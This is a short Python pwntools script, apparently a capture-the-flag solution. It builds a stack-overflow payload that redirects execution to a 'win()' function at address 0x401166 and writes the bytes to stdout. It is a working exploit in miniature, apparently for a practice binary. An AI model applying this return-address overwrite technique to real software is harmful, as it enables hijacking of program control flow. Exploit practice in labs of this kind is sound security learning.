from pwn import *
import sys
chain = b''
chain += pack(0x64, word_size='64', endianness='little')
chain += b'\x00\x00'		# b'\x00\x00'
chain += pack(0x401166, word_size='64', endianness='little')		# win()
chain += b'\xde\xad'		# b'\xde\xad'
sys.stdout.buffer.write(chain)
